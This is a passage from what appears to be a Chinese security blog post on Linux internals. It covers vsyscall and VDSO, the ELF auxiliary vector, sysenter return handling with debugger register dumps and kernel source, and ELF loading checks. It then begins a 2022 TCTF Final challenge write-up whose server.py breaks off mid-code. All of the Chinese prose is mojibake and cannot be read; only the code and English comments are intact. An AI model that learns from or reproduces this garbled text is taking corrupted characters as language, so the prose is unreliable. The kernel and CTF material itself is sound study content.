<strong>__kernel_vsyscall</strong> è¯»å–è®¡ç®—ï¼Œç›¸å½“äºå°†ç³»ç»Ÿè°ƒç”¨å˜æˆäº†å‡½æ•°è°ƒç”¨ï¼Œæé«˜æ•ˆç‡æ•ˆæœæ˜¾è‘—</p></li></ul><p>ä½† <strong>vsyscall</strong> å­˜åœ¨ä¸€äº›é—®é¢˜</p><ul><li>åœ°å€å›ºå®šï¼Œå®¹æ˜“æˆä¸ºret2libcçš„è·³æ¿</li><li>æ”¯æŒçš„ç³»ç»Ÿè°ƒç”¨æœ‰é™ï¼Œä¸”ä¸æ˜“æ‰©å±•</li></ul><p>æ‰€ä»¥æœ‰äº† <strong>VDSO</strong></p><ul><li><strong>VDSO</strong> æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªELFå…±äº«ç›®æ ‡æ–‡ä»¶ï¼›è€Œ <strong>vsyscall</strong> åªæ˜¯ä¸€æ®µå†…å­˜ä»£ç å’Œæ•°æ®ã€‚</li><li><strong>vsyscall</strong> ä½äºå†…æ ¸åœ°å€ç©ºé—´ï¼Œé‡‡ç”¨é™æ€åœ°å€æ˜ å°„æ–¹å¼ï¼›è€Œ <strong>VDSO</strong> å€ŸåŠ©å…±äº«ç›®æ ‡æ–‡ä»¶å¤©ç”Ÿå…·æœ‰çš„PICç‰¹æ€§ï¼Œå¯ä»¥ä»¥è¿›ç¨‹ä¸ºç²’åº¦åŠ¨æ€æ˜ å°„åˆ°è¿›ç¨‹åœ°å€ç©ºé—´ä¸­</li></ul><h2 id="Auxiliary-Vector"><a href="#Auxiliary-Vector" class="headerlink" title="Auxiliary Vector"></a>Auxiliary Vector</h2><p>è¾…åŠ©ä¿¡æ¯æ•°ç»„ï¼Œç”¨æ¥åœ¨ldåˆå§‹å·¥ä½œï¼Œæ²¡æœ‰å®Œå–„çš„è¿è¡Œç¯å¢ƒæ—¶ï¼Œæä¾›ä¸€äº›æç¤ºæ€§çš„ä¿¡æ¯ï¼Œåœ¨æ ˆä¸Šï¼ˆenvpä¹‹åï¼‰</p><p>ç›¸å…³ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">uint64_t</span> a_type;<span class="hljs-comment">/* Entry type */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-type">uint64_t</span> a_val;<span class="hljs-comment">/* Integer value */</span><br>      <span class="hljs-comment">/* We use to have pointer elements added here.  We cannot do that,</span><br><span class="hljs-comment"> though, since it does not work when using 32-bit definitions</span><br><span class="hljs-comment"> on 64-bit platforms and vice versa.  */</span><br>    &#125; a_un;<br>&#125; Elf64_auxv_t;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_NULL0<span class="hljs-comment">/* End of vector */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_IGNORE1<span class="hljs-comment">/* Entry should be ignored */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_EXECFD2<span class="hljs-comment">/* ldå¯èƒ½åˆ©ç”¨æ“ä½œç³»ç»Ÿçš„è¯»å†™åŠŸèƒ½è®¿é—®ELFï¼Œè¿™æ˜¯ELFçš„fd */</span></span><br>   <span class="hljs-comment">/* ldä¹Ÿå¯èƒ½ç›´æ¥å°†ELFæ˜ å°„è¿›å†…å­˜ï¼Œè¿™æ—¶å€™ä¸ºäº†æä¾›ç©ºé—´å°±éœ€è¦ä»¥ä¸‹å‡ é¡¹ */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_PHDR3<span class="hljs-comment">/* Program Header Tableçš„åœ°å€ */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_PHENT4<span class="hljs-comment">/* Size of program header entry */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_PHNUM5<span class="hljs-comment">/* Number of program headers */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_PAGESZ6<span class="hljs-comment">/* System page size */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_BASE7<span class="hljs-comment">/* Base address of interpreter */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_FLAGS8<span class="hljs-comment">/* Flags */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_ENTRY9<span class="hljs-comment">/* Entry point of program */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_NOTELF10<span class="hljs-comment">/* Program is not ELF */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_UID11<span class="hljs-comment">/* Real uid */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_EUID12<span class="hljs-comment">/* Effective uid */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_GID13<span class="hljs-comment">/* Real gid */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_EGID14<span class="hljs-comment">/* Effective gid */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_CLKTCK17<span class="hljs-comment">/* Frequency of times() */</span></span><br></code></pre></td></tr></table></figure><h2 id="sysenter"><a href="#sysenter" class="headerlink" title="sysenter"></a>sysenter</h2><p><em>qemuè°ƒsysenteré€‰ä¸€ä¸ªIntelçš„cpuå°±è¡Œäº†ï¼Œæ¯”å¦‚Broadwell-v1</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 -cpu help<br></code></pre></td></tr></table></figure><p>è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆsysenterè¿”å›ä¹‹åç¨‹åºå›è·‘é£</p><ul><li><p>åœ¨ä¸€ç³»åˆ—å¤„ç†ä¹‹åä¼šè°ƒç”¨do_SYSENTER_32æ­£å¼å¤„ç†sysenterï¼Œåœ¨è¿™ä¹‹å‰çš„pt_regs</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>â”‚ rdi rsp <span class="hljs-number">0xffffc90000463f58</span> â—‚â€” <span class="hljs-number">0x1</span>r15<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>â”‚         <span class="hljs-number">0xffffc90000463f60</span> â€”â–¸ <span class="hljs-number">0x4c17d0</span>r14<br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>â”‚         <span class="hljs-number">0xffffc90000463f68</span> â€”â–¸ <span class="hljs-number">0x7ffe7a28fff8</span> r13<br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>â”‚         <span class="hljs-number">0xffffc90000463f70</span> â—‚â€” <span class="hljs-number">0x1</span>r12<br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>â”‚         <span class="hljs-number">0xffffc90000463f78</span> â€”â–¸ <span class="hljs-number">0x7ffe7a28fe10</span> bp<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>â”‚         <span class="hljs-number">0xffffc90000463f80</span> â—‚â€” <span class="hljs-number">0x2c</span>bx<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>â”‚         <span class="hljs-number">0xffffc90000463f88</span> â—‚â€” <span class="hljs-number">0x206</span>r11<br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>â”‚         <span class="hljs-number">0xffffc90000463f90</span> â—‚â€” <span class="hljs-number">0x80</span>r10<br><span class="hljs-number">08</span>:<span class="hljs-number">0040</span>â”‚         <span class="hljs-number">0xffffc90000463f98</span> â—‚â€” <span class="hljs-number">0x800000000000</span> r9<br><span class="hljs-number">09</span>:<span class="hljs-number">0048</span>â”‚         <span class="hljs-number">0xffffc90000463fa0</span> â€”â–¸ <span class="hljs-number">0x4c7d70</span> r8<br><span class="hljs-number">0</span>a:<span class="hljs-number">0050</span>â”‚         <span class="hljs-number">0xffffc90000463fa8</span> â—‚â€” <span class="hljs-number">0xffffffffffffffda</span>  ax<br><span class="hljs-number">0b</span>:<span class="hljs-number">0058</span>â”‚         <span class="hljs-number">0xffffc90000463fb0</span> â—‚â€” <span class="hljs-number">0xa</span>cx<br><span class="hljs-number">0</span>c:<span class="hljs-number">0060</span>â”‚         <span class="hljs-number">0xffffc90000463fb8</span> â€”â–¸ <span class="hljs-number">0x7ffe7a290008</span> dx<br><span class="hljs-number">0</span>d:<span class="hljs-number">0068</span>â”‚         <span class="hljs-number">0xffffc90000463fc0</span> â€”â–¸ <span class="hljs-number">0x7ffe7a28fff8</span> si<br><span class="hljs-number">0</span>e:<span class="hljs-number">0070</span>â”‚         <span class="hljs-number">0xffffc90000463fc8</span> â—‚â€” <span class="hljs-number">0x1</span>di<br><span class="hljs-number">0f</span>:<span class="hljs-number">0078</span>â”‚         <span class="hljs-number">0xffffc90000463fd0</span> â—‚â€” <span class="hljs-number">0x1</span>orig_ax<br><span class="hljs-number">10</span>:<span class="hljs-number">0080</span>â”‚         <span class="hljs-number">0xffffc90000463fd8</span> â—‚â€” <span class="hljs-number">0x0</span>ip<br><span class="hljs-number">11</span>:<span class="hljs-number">0088</span>â”‚         <span class="hljs-number">0xffffc90000463fe0</span> â—‚â€” <span class="hljs-number">0x23</span>cs<br><span class="hljs-number">12</span>:<span class="hljs-number">0090</span>â”‚         <span class="hljs-number">0xffffc90000463fe8</span> â—‚â€” <span class="hljs-number">0x6</span>flags<br><span class="hljs-number">13</span>:<span class="hljs-number">0098</span>â”‚         <span class="hljs-number">0xffffc90000463ff0</span> â—‚â€” <span class="hljs-number">0x0</span>sp<br><span class="hljs-number">14</span>:<span class="hljs-number">00</span>a0â”‚         <span class="hljs-number">0xffffc90000463ff8</span> â—‚â€” <span class="hljs-number">0x2b</span>ss<br></code></pre></td></tr></table></figure><p>æ¥åº·åº·ä¸ºä»€ä¹ˆä¼šå˜æˆè¿™æ ·ï¼Œå’Œç”¨æˆ·æ€ä¸ä¸€æ ·çš„å¯„å­˜å™¨æœ‰rspï¼Œripï¼Œcsï¼ˆä¸ç®¡raxï¼Œssï¼Œcsï¼‰</p><p>åœ¨pushå¯„å­˜å™¨çš„æ—¶å€™ä¼šç›´æ¥æŠŠrspå’Œripè®°ä¸º0ï¼Œcsç½®ä¸º32ä½çš„cs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pushq$0/* pt_regs-&gt;sp = 0 (placeholder) */<br>pushfq/* pt_regs-&gt;flags (except IF = 0) */<br>pushq$__USER32_CS/* pt_regs-&gt;cs */<br>pushq$0/* pt_regs-&gt;ip = 0 (placeholder) */<br></code></pre></td></tr></table></figure></li><li><p>è°ƒç”¨do_SYSENTER_32åçš„pt_regs</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>â”‚ rsp <span class="hljs-number">0xffffc90000463f58</span> â—‚â€” <span class="hljs-number">0x1</span>r15<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>â”‚     <span class="hljs-number">0xffffc90000463f60</span> â€”â–¸ <span class="hljs-number">0x4c17d0</span> r14<br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>â”‚     <span class="hljs-number">0xffffc90000463f68</span> â€”â–¸ <span class="hljs-number">0x7ffe7a28fff8</span> r13<br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>â”‚     <span class="hljs-number">0xffffc90000463f70</span> â—‚â€” <span class="hljs-number">0x1</span>r12<br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>â”‚     <span class="hljs-number">0xffffc90000463f78</span> â—‚â€” <span class="hljs-number">0x7ffe00000000</span> bp<span class="hljs-comment">// change!</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>â”‚     <span class="hljs-number">0xffffc90000463f80</span> â—‚â€” <span class="hljs-number">0x2c</span>bx<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>â”‚     <span class="hljs-number">0xffffc90000463f88</span> â—‚â€” <span class="hljs-number">0x206</span>r11<br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>â”‚     <span class="hljs-number">0xffffc90000463f90</span> â—‚â€” <span class="hljs-number">0x80</span>r10<br><span class="hljs-number">08</span>:<span class="hljs-number">0040</span>â”‚     <span class="hljs-number">0xffffc90000463f98</span> â—‚â€” <span class="hljs-number">0x800000000000</span> r9<br><span class="hljs-number">09</span>:<span class="hljs-number">0048</span>â”‚     <span class="hljs-number">0xffffc90000463fa0</span> â€”â–¸ <span class="hljs-number">0x4c7d70</span> r8<br><span class="hljs-number">0</span>a:<span class="hljs-number">0050</span>â”‚     <span class="hljs-number">0xffffc90000463fa8</span> â—‚â€” <span class="hljs-number">0xfffffffffffffff2</span>  ax<br><span class="hljs-number">0b</span>:<span class="hljs-number">0058</span>â”‚     <span class="hljs-number">0xffffc90000463fb0</span> â—‚â€” <span class="hljs-number">0xa</span>cx<br><span class="hljs-number">0</span>c:<span class="hljs-number">0060</span>â”‚     <span class="hljs-number">0xffffc90000463fb8</span> â€”â–¸ <span class="hljs-number">0x7ffe7a290008</span> dx<br><span class="hljs-number">0</span>d:<span class="hljs-number">0068</span>â”‚     <span class="hljs-number">0xffffc90000463fc0</span> â€”â–¸ <span class="hljs-number">0x7ffe7a28fff8</span> si<br><span class="hljs-number">0</span>e:<span class="hljs-number">0070</span>â”‚     <span class="hljs-number">0xffffc90000463fc8</span> â—‚â€” <span class="hljs-number">0x1</span>di<br><span class="hljs-number">0f</span>:<span class="hljs-number">0078</span>â”‚     <span class="hljs-number">0xffffc90000463fd0</span> â—‚â€” <span class="hljs-number">0x1</span>orig_ax<br><span class="hljs-number">10</span>:<span class="hljs-number">0080</span>â”‚     <span class="hljs-number">0xffffc90000463fd8</span> â€”â–¸ <span class="hljs-number">0x7ffe7a3f0579</span> ip<span class="hljs-comment">// change!</span><br><span class="hljs-number">11</span>:<span class="hljs-number">0088</span>â”‚     <span class="hljs-number">0xffffc90000463fe0</span> â—‚â€” <span class="hljs-number">0x23</span>cs<br><span class="hljs-number">12</span>:<span class="hljs-number">0090</span>â”‚     <span class="hljs-number">0xffffc90000463fe8</span> â—‚â€” <span class="hljs-number">0x206</span>flags<span class="hljs-comment">// change!</span><br><span class="hljs-number">13</span>:<span class="hljs-number">0098</span>â”‚     <span class="hljs-number">0xffffc90000463ff0</span> â€”â–¸ <span class="hljs-number">0x7ffe7a28fe10</span> sp <span class="hljs-comment">// change!</span><br><span class="hljs-number">14</span>:<span class="hljs-number">00</span>a0â”‚     <span class="hljs-number">0xffffc90000463ff8</span> â—‚â€” <span class="hljs-number">0x2b</span>ss<br><br></code></pre></td></tr></table></figure><ul><li><p>sysenterä½¿ç”¨rbpä½œä¸ºè¿”å›æ—¶çš„rspï¼Œflagsè¦åŠ ä¸ŠX86_EFLAGS_IFçš„æ ‡å¿—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">__visible noinstr <span class="hljs-type">long</span> <span class="hljs-title function_">do_SYSENTER_32</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pt_regs *regs)</span><br>&#123;<br><span class="hljs-comment">/* SYSENTER loses RSP, but the vDSO saved it in RBP. */</span><br>regs-&gt;sp = regs-&gt;bp;<br><br><span class="hljs-comment">/* SYSENTER clobbers EFLAGS.IF.  Assume it was set in usermode. */</span><br>regs-&gt;flags |= X86_EFLAGS_IF;<br><br><span class="hljs-keyword">return</span> do_fast_syscall_32(regs);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>do_fast_syscall_32ä¼šè‡ªåŠ¨è®¾ç½®ripä¸ºvsdoä¸­ä¸€æ®µå›ºå®šçš„landingçš„åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> landing_pad = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)current-&gt;mm-&gt;context.vdso +<br>vdso_image_32.sym_int80_landing_pad;<br>    <br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * SYSENTER loses EIP, and even SYSCALL32 needs us to skip forward</span><br><span class="hljs-comment"> * so that &#x27;regs-&gt;ip -= 2&#x27; lands back on an int $0x80 instruction.</span><br><span class="hljs-comment"> * Fix it up.</span><br><span class="hljs-comment"> */</span><br>regs-&gt;ip = landing_pad;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>ç”±äºå·²ç»å°†csè®¾ç½®ä¸º32ä½ï¼Œæ‰€ä»¥iretqä¹‹åå¯„å­˜å™¨ä¼šè¢«æˆªåŠ</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/iretq.png" class title="iretq"></li></ul><p>æ¥çœ‹ä¸€ä¸‹æ­£å¸¸çš„sysenterçš„æ‰§è¡Œè¿‡ç¨‹</p><ul><li><p>ä¸€ä¸ªsysenterä¸€å®šæ˜¯ä»vdsoä¸­æ¥çš„ï¼ˆä¼ å‚é¡ºåºebxï¼Œecxï¼Œedxï¼‰</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/writevdso.png" class title="writevdso"><p>å¯ä»¥çœ‹å‡ºebpæ˜¯ç”¨æ¥å­˜espçš„</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/vdsoo.png" class title="vdso"><p>sysenterçš„å‚æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Arguments:</span><br><span class="hljs-comment"> * eax  system call number</span><br><span class="hljs-comment"> * ebx  arg1</span><br><span class="hljs-comment"> * ecx  arg2</span><br><span class="hljs-comment"> * edx  arg3</span><br><span class="hljs-comment"> * esi  arg4</span><br><span class="hljs-comment"> * edi  arg5</span><br><span class="hljs-comment"> * ebp  user stack</span><br><span class="hljs-comment"> * 0(%ebp) arg6</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure></li><li><p>do_SYSENTER_32è¿”å›ä¹‹åï¼Œå¯ä»¥çœ‹å‡ºlanding_padå·²ç»è®¾ç½®å¥½äº†</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/landing.png" class title="landing"></li><li><p>landingæˆåŠŸï¼ˆå¦‚æœsysenterå¤±è´¥è¿˜è¦ç»§ç»­int 0x80ï¼‰</p></li></ul><h2 id="ELFæ–‡ä»¶å¯åŠ¨è¿‡ç¨‹"><a href="#ELFæ–‡ä»¶å¯åŠ¨è¿‡ç¨‹" class="headerlink" title="ELFæ–‡ä»¶å¯åŠ¨è¿‡ç¨‹"></a>ELFæ–‡ä»¶å¯åŠ¨è¿‡ç¨‹</h2><p>è§£é‡Šä¸€äº›ç‰¹æ€§çš„åŸç†</p><ul><li><p>GNU_STACKè®¾ä¸ºXåˆ™æƒé™ä¸ºRWX</p><p>Linuxä¸­å¯¹äºæ ˆçš„æƒé™åªæœ‰å¯æ‰§è¡Œå’Œä¸å¯æ‰§è¡Œçš„åˆ¤æ–­ï¼Œé»˜è®¤æ˜¯å¯è¯»å†™çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Stack area protections */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXSTACK_DEFAULT   0<span class="hljs-comment">/* Whatever the arch defaults to */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXSTACK_DISABLE_X 1<span class="hljs-comment">/* Disable executable stacks */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXSTACK_ENABLE_X  2<span class="hljs-comment">/* Enable executable stacks */</span></span><br><br><br>elf_ppnt = elf_phdata;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; elf_ex-&gt;e_phnum; i++, elf_ppnt++)<br><span class="hljs-keyword">switch</span> (elf_ppnt-&gt;p_type) &#123;<br><span class="hljs-keyword">case</span> PT_GNU_STACK:<br><span class="hljs-keyword">if</span> (elf_ppnt-&gt;p_flags &amp; PF_X)<br>executable_stack = EXSTACK_ENABLE_X;<br><span class="hljs-keyword">else</span><br>executable_stack = EXSTACK_DISABLE_X;<br><span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure></li><li><p>64ä½å’Œ32ä½çš„æ£€æŸ¥æ˜¯é€šè¿‡e_machine</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Verify the interpreter has a valid arch */</span><br><span class="hljs-keyword">if</span> (!elf_check_arch(interp_elf_ex) ||<br>    elf_check_fdpic(interp_elf_ex))<br><span class="hljs-keyword">goto</span> out_free_dentry;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>elf_check_archcompat_elf_check_arch</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> compat_elf_check_arch(x)\</span><br><span class="hljs-meta">(elf_check_arch_ia32(x) ||\</span><br><span class="hljs-meta"> (IS_ENABLED(CONFIG_X86_X32_ABI) &amp;&amp; (x)-&gt;e_machine == EM_X86_64))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> elf_check_arch_ia32(x) \</span><br><span class="hljs-meta">(((x)-&gt;e_machine == EM_386) || ((x)-&gt;e_machine == EM_486))</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="2022-TCTF-Final-æ— ä¸­ç”Ÿæœ‰"><a href="#2022-TCTF-Final-æ— ä¸­ç”Ÿæœ‰" class="headerlink" title="2022 TCTF Final æ— ä¸­ç”Ÿæœ‰"></a>2022 TCTF Final æ— ä¸­ç”Ÿæœ‰</h1><h2 id="server-py"><a href="#server-py" class="headerlink" title="server.py"></a>server.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3 -u</span><br><br><span class="hljs-keyword">import</span> os, sys, random, subprocess, gmpy2<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> elftools.elf.elffile <span class="hljs-keyword">import</span> ELFFile<br><span class="hljs-keyword">from</span> elftools.elf.constants <span class="hljs-keyword">import</span> P_FLAGS<br><br>os.chdir(os.path.dirname(__file__))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proof_of_work</span>(<span class="hljs-params">sec = <span class="hljs-number">10</span></span>):<br>    <span class="hljs-comment"># From 0CTF/TCTF 2021</span><br>    p = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    q = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    n = p*q<br>    c = <span class="hljs-number">2900000</span><br>    t = c*sec + random.randint(<span class="hljs-number">0</span>,c)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Show me your computation:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;2^(2^<span class="hljs-subst">&#123;t&#125;</span>) mod <span class="hljs-subst">&#123;n&#125;</span> = ?&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your answer: &#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        sol = <span 